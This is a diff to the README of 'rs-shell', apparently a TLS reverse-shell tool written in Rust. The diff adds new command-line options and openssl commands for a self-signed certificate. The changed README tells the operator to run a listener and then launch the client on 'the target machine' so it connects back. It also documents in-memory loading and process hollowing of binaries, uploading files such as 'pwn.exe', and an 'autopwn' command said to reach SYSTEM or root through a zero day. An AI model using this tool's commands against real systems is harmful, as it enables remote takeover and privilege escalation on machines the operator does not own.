@@ -31,17 +31,22 @@ For the moment, the following features are present:
 
 ### Setup
 
-First of all, the full path of your TLS certificate and its password must be configured in the file `server.rs` in place of the tags `[CERTFICATE_PATH]` and `[CERTIFICATE_PASSWORD]`.
-
-Additionally, I have set a `dummy` domain for hostname validation in the `connect()` function for both clients. If you use a signed certificate for a real server, you can change it and remove the unsecure functions that remove hostname and certs validations.
+I have set a `dummy` domain for hostname validation in the `connect()` function for both clients. If you use a signed certificate for a real server, you can change it and remove the unsecure functions that remove hostname and certs validations.
 
 By default, only the `error`, `warn` and `info` logs are displayed. If you also need the `debug` ones (can be usefull for the loading features), you can change this in `main.rs` by modifying `::log::set_max_level(LevelFilter::Info);` to `::log::set_max_level(LevelFilter::Debug);`.
 
+A new self-signed TLS certificate can be obtained like this :
+
+```bash
+openssl req -newkey rsa:2048 -nodes -keyout private.key -x509 -days 365 -out certificate.cer
+openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.cr
+```
+
 ### Compilation
 
-The project can be compiled with `cargo build --release` on Windows or Linux and the binary will be present in `target/release/`.
+The project can be compiled with `cargo build --release` on Windows or Linux and the binary will be present in `target/release/`, or the target name if a target is specified.
 
-Tu compile for a different target than your current OS you can use `cargo build --release --target x86_64-unknown-linux-gnu`.
+Tu compile for a different target than your current OS you can use, for example, `cargo build --release --target x86_64-unknown-linux-gnu` (be sure to use the appropriate toolchain and to have all the required dependencies).
 
 The project compilation has been tested with the following Rust toolchains :
 
@@ -55,20 +60,23 @@ Should run on all Windows and Linux versions (I have hope).
 ### Usage
 
 ```plain
-Usage : shell.exe [l | c] IP port
+Usage: rs-shell.exe [OPTIONS] --side <side> --ip <ip> --port <port>
 
-    l       launch the listener application
-    c       launch the client application
+Options:
+  -s, --side <side>            launch the client or the listener [possible values: c, l]
+  -i, --ip <ip>                IP address to bind to for the listener, or to connect to for the clien
+  -p, --port <port>            port address to bind to for the listener, or to connect to for the client
+      --cert-path <cert_path>  path of the TLS certificate (in PFX or PKCS12 format) for the server
+      --cert-pass <cert_pass>  password of the TLS certificate for the server
+  -h, --help                   Print help
+  -V, --version                Print version
 
-    IP      IP address to bind to for the listener, or to connect to for the client
-    port    port address to bind to for the listener, or to connect to for the client
-
-    In a session, type 'help' for advanced integrated commands
+In a session, type 'help' for advanced integrated commands
 ```
 
-To obtain a session, just launch the binary in listener mode on your machine with `rs-shell.exe l IP_to_bind_to port_to_bind_to`. For example `rs-shell.exe l 0.0.0.0 4545`.
+To obtain a session, just launch the binary in listener mode on your machine with `rs-shell.exe -s l -i IP_to_bind_to -p port_to_bind_to --cert-path certificate_path --cert-pass certificate_password`. For example `rs-shell.exe -s l -i 0.0.0.0 -p 4545 --cert-path certificate.pfx --cert-pass "Password"`.
 
-Then, on the target machine launch the client to connect back to your server with `rs-shell.exe c IP_to_connect_to port_to_connect_to`. For example `rs-shell.exe c 192.168.1.10 4545`.
+Then, on the target machine launch the client to connect back to your server with `rs-shell.exe -s c -i IP_to_connect_to -p port_to_connect_to`. For example `rs-shell.exe -s c --ip 192.168.1.10 --port 4545`.
 
 ### Advanced commands
 
@@ -96,7 +104,7 @@ Then, on the target machine launch the client to connect back to your server wit
 
     [+] Special commands
     > autopwn
-        escalate to the SYSTEM account from any local account by exploiting a zero day
+        escalate to the SYSTEM or root account from any local account by exploiting a zero day
 ```
 
 The `load` commands permit to load and execute directly in memory:
@@ -113,7 +121,7 @@ For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.ex
 
 `upload` permits to upload a file on the client machine. For example `upload ./pwn.exe C:\Temp\pwn.exe`.
 
-`autopwn` permits to escalate to the **SYSTEM account** with a 0day exploitation. Just type `autopwn` and answer the question.
+`autopwn` permits to escalate to the **SYSTEM or root account** with a 0day exploitation. Just type `autopwn` and answer the question.
 
 ## Todo
 
